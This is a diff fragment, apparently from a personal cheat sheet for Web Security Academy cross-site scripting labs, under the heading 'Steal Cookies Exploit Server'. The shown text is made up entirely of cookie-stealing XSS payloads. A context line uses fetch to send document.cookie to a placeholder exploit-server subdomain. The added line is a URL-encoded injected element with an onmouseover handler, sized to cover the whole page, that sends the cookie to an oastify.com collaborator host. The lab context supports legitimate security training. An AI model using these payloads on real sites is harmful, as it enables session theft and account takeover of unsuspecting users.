@@ -363,3 +363,4 @@ Steal Cookies Exploit Server:
 ```
 <script> fetch(‘https://YOUR-SUBDOMAIN-HERE.exploitserver.net/x’+document.cookie); </script>
 ```
+<script src="https://0a18002f0338b8e78172ca54001b0096.web-security-academy.net/?search_term=%3Cxss+id%3Ddux8x+onmouseover%3Dfetch%28%27https%3A%2F%2Fyqsn2nmx3qehvxkuqrr2tgzuslycm7aw.oastify.com%3Fc%3D%27%2Bdocument.cookie%29+style%3Dposition%3Aabsolute%3Bwidth%3A100%25%3Bheight%3A100%25%3Btop%3A0%3Bleft%3A0%3B+hvjfa+onbeforeinput%3Dalert%28%29%3E"></script>
